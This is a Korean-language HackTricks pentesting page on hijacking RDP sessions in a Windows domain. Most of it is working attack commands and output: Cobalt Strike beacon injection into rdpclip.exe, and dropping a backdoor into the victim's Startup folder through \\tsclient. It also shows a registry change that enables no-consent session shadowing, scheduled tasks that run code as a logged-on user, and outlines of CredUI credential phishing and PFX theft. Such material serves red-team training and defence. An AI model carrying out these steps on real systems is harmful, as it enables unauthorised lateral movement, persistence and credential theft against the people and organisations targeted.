# RDP 세션 악용

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

만약 **외부 그룹**이 현재 도메인 내의 어떤 **컴퓨터**에 대해 **RDP access** 권한을 가지고 있다면, **공격자**는 **그 컴퓨터를 침해하고 해당 사용자가 접속할 때까지 기다릴 수 있습니다**.

해당 사용자가 RDP로 접속하면, **공격자는 그 사용자의 세션으로 pivot할 수 있습니다** 및 외부 도메인에서 그 사용자의 권한을 남용할 수 있습니다.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
다음에서 확인하세요: **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

사용자가 **RDP into a machine**으로 접속했는데 그곳에 **attacker**가 그를 **waiting**하고 있으면, attacker는 **inject a beacon in the RDP session of the user**할 수 있고, 만약 **victim mounted his drive**를 RDP 접속 시 마운트했다면 **attacker could access it**.

이 경우에는 단순히 **compromise**하여 **victims** **original computer**를 장악할 수 있으며, **backdoor**를 **statup folder**에 작성하면 됩니다.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

만약 당신이 피해자가 이미 있는 호스트에서 **local admin**이고 피해자가 **active RDP session**을 가지고 있다면, 비밀번호를 훔치거나 LSASS를 덤프하지 않고도 **view/control that desktop without stealing the password or dumping LSASS**할 수 있습니다.

이는 **Remote Desktop Services shadowing** 정책에 저장된 설정에 따라 달라집니다:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
흥미로운 값:

- `0`: 비활성화
- `1`: `EnableInputNotify` (제어, 사용자 승인 필요)
- `2`: `EnableInputNoNotify` (제어, **사용자 승인 불필요**)
- `3`: `EnableNoInputNotify` (보기 전용, 사용자 승인 필요)
- `4`: `EnableNoInputNoNotify` (보기 전용, **사용자 승인 불필요**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
이는 권한이 있는 사용자가 RDP로 연결되어 잠금 해제된 데스크톱, KeePass 세션, MMC 콘솔, 브라우저 세션 또는 admin shell을 열어둔 경우에 특히 유용합니다.

## 로그온된 사용자로서의 예약 작업

만약 당신이 **로컬 관리자**이고 대상 사용자가 **현재 로그인된 상태**라면, Task Scheduler는 해당 사용자의 비밀번호 없이 **그 사용자로서 코드를 시작**할 수 있습니다.

이로써 피해자의 기존 로그온 세션이 실행 수단으로 바뀝니다:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
참고:

- 사용자가 **로그온되어 있지 않은 경우**, Windows는 보통 해당 사용자로 실행되는 작업을 만들 때 암호를 요구합니다.
- 사용자가 **로그온되어 있는 경우**, 작업은 기존 로그온 컨텍스트를 재사용할 수 있습니다.
- 이는 LSASS에 접근하지 않고 피해자 세션 내부에서 GUI 작업을 실행하거나 바이너리를 실행하는 실용적인 방법입니다.

## CredUI Prompt Abuse From the Victim Session

피해자의 인터랙티브 데스크톱 내부에서 실행할 수 있게 되면(예: **Shadow RDP** 또는 **a scheduled task running as that user**를 통해), CredUI APIs를 사용하여 **실제 Windows 자격 증명 프롬프트**를 표시하고 피해자가 입력한 자격 증명을 수집할 수 있습니다.

관련 API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

일반적인 흐름:

1. 피해자 세션에서 바이너리를 실행합니다.
2. 현재 도메인 브랜딩과 일치하는 도메인 인증 프롬프트를 표시합니다.
3. 반환된 인증 버퍼를 언팩합니다.
4. 제공된 자격 증명을 검증하고, 유효한 자격 증명이 입력될 때까지(선택적으로) 계속 프롬프트를 표시합니다.

프롬프트가 가짜 HTML 양식 대신 표준 Windows API에 의해 렌더링되기 때문에 이는 **on-host phishing**에 유용합니다.

## Requesting a PFX In the Victim Context

동일한 **scheduled-task-as-user** primitive를 사용하면 **로그온한 피해자 사용자로서의 certificate/PFX**를 요청할 수 있습니다. 해당 인증서는 이후 해당 사용자로서 **AD authentication**에 사용되어 암호 탈취를 완전히 회피할 수 있습니다.

개략적 흐름:

1. 피해자가 로그인한 호스트에서 **local admin** 권한을 획득합니다.
2. **scheduled task**를 사용해 피해자 권한으로 enrollment/export 로직을 실행합니다.
3. 결과로 생성된 **PFX**를 내보냅니다.
4. PKINIT / 인증서 기반 AD authentication에 PFX를 사용합니다.

후속 악용에 대해서는 AD CS 페이지를 참조하세요:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
